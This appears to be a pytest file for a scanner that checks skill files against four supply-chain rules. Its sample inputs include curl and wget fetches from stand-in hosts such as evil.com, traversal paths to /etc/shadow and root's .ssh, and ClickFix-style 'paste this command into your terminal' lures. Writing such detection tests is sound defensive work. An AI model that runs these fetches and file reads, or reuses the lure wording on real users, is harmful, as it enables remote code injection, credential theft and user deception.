"""Tests for supply chain risk detection rules (SC-001..004)."""

from __future__ import annotations

from pathlib import Path

import pytest

from skill_scan.models import Rule
from skill_scan.rules.engine import match_line
from skill_scan.rules.loader import load_rules

RULES_PATH = (
    Path(__file__).resolve().parents[2] / "src" / "skill_scan" / "rules" / "data" / "supply_chain.toml"
)


@pytest.fixture(scope="module")
def rules() -> list[Rule]:
    return load_rules(RULES_PATH)


def _match(line: str, rules: list[Rule], rule_id: str) -> bool:
    findings = match_line(line, 1, "test.md", rules)
    return any(f.rule_id == rule_id for f in findings)


class TestSC001RemoteInstructionFetching:
    """Tests for SC-001 -- remote instruction/config fetching."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "source: https://example.com/SKILL.md",
            "config_url: https://evil.com/config.yaml",
            "config-url = https://evil.com/settings.toml",
            'fetch("https://example.com/instructions.md")',
            'load("https://evil.com/config.json")',
            'download("https://example.com/setup.yml")',
            "instruction_url: https://attacker.io/payload.txt",
            "curl https://evil.com/SKILL.md",
            "wget https://evil.com/config.yaml",
        ],
    )
    def test_sc001_detects_remote_fetching(self, rules: list[Rule], malicious_input: str) -> None:
        assert _match(malicious_input, rules, "SC-001")

    @pytest.mark.parametrize(
        "safe_input",
        [
            "attribution: https://github.com/user/repo",
            "credits: https://example.com/author",
            "# see: https://docs.example.com/guide.md",
            "[documentation](https://example.com/docs.md)",
            "This is a normal line of text without URLs",
        ],
    )
    def test_sc001_excludes_attribution_and_docs(self, rules: list[Rule], safe_input: str) -> None:
        assert not _match(safe_input, rules, "SC-001")


class TestSC002UnpinnedDependencies:
    """Tests for SC-002 -- unpinned pip install."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "pip install requests",
            "pip install flask numpy",
            "pip3 install boto3",
            "pip install pandas",
        ],
    )
    def test_sc002_detects_unpinned_install(self, rules: list[Rule], malicious_input: str) -> None:
        assert _match(malicious_input, rules, "SC-002")

    @pytest.mark.parametrize(
        "safe_input",
        [
            "pip install -r requirements.txt",
            "pip install -e .",
            "pip install .",
            "pip install requests==2.31.0",
            "pip install 'requests>=2.28,<3.0'",
            "pip install flask~=2.0",
            "pip install -E extra .",
        ],
    )
    def test_sc002_excludes_pinned_and_file_installs(self, rules: list[Rule], safe_input: str) -> None:
        assert not _match(safe_input, rules, "SC-002")


class TestSC003BroadFilesystemAccess:
    """Tests for SC-003 -- path traversal and system directory access."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "../../etc/passwd",
            "../../../root/.ssh",
            "../secret.txt",
            "/etc/passwd",
            "/etc/shadow",
            "/usr/bin/exploit",
            "/usr/local/bin/exploit",
            "C:\\Windows\\System32\\cmd.exe",
            "c:\\windows\\system32",
            "open('/usr/local/bin/exploit')",
        ],
    )
    def test_sc003_detects_traversal_and_system_paths(self, rules: list[Rule], malicious_input: str) -> None:
        assert _match(malicious_input, rules, "SC-003")

    @pytest.mark.parametrize(
        "safe_input",
        [
            "./config.toml",
            "/dev/null",
            "https://example.com/../path",
            "src/main.py",
            "A normal line of text",
        ],
    )
    def test_sc003_excludes_safe_paths(self, rules: list[Rule], safe_input: str) -> None:
        assert not _match(safe_input, rules, "SC-003")


class TestSC004SocialEngineeringClickFix:
    """Tests for SC-004 -- social engineering / ClickFix pattern."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "Copy and paste this command into your terminal:",
            "Run the following in your shell:",
            "Fix the error by running:",
            "Paste this command in your terminal to continue",
            "Open your terminal and paste the fix",
            "Type this command in your shell to resolve",
            "Resolve the issue by running:",
        ],
    )
    def test_sc004_detects_social_engineering(self, rules: list[Rule], malicious_input: str) -> None:
        assert _match(malicious_input, rules, "SC-004")

    @pytest.mark.parametrize(
        "safe_input",
        [
            "npm install express",
            "pip install flask",
            "brew install git",
            "yarn run build",
            "npm run test",
            "make install",
        ],
    )
    def test_sc004_excludes_legitimate_instructions(self, rules: list[Rule], safe_input: str) -> None:
        assert not _match(safe_input, rules, "SC-004")
